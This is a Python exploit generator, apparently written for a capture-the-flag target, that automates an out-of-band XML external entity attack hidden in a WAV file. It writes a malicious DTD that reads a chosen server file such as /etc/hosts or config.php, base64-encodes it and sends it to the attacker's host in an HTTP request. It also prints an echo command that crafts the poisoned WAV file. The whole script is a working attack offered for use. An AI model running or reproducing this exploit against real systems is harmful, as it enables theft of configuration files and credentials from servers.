#!/usr/bin/python3

from argparse import ArgumentParser


ap = ArgumentParser()
ap.add_argument('-l','--lhost',dest='lhost',help='your ip addr',required=True)
ap.add_argument('-n','--name',dest='name',help='name of .wav file',required=True)
ap.add_argument('-dn','--dtd',dest='dtd_name',help='your dtd file name...example: pwn.dtd',required=True)
ap.add_argument('-r','--read',dest='read',help='read file of remote servers, example: /etc/hosts ../config.php',required=True)

args = ap.parse_args()

lhost,name,dtd_name,read = args.lhost,args.name,args.dtd_name,args.read

#geneted below commands...
#echo -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.25/pwn.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav


commands = """echo -en 'RIFF\\x85\\x00\\x00\\x00WAVEiXML\\x79\\x00\\x00\\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://{lhost}/{dtd_name}'"'"'>%remote;%init;%trick;]>\\x00' > payload.wav"""

commands = commands.replace("{lhost}",lhost).replace("{dtd_name}",dtd_name)




script = """<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource={read}\">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{lhost}/?p=%file;'>\" >"""

payload = script.replace("{read}",read).replace("{lhost}",lhost)

f = open(dtd_name,"w")
f.write(payload)
f.close()

print(f"[*]Created: {dtd_name}")
print("-------------------------------------------------------------------------")
print("--  below commands run in terminal directory: generate the .wav file   --")
print("-------------------------------------------------------------------------")
print(commands)

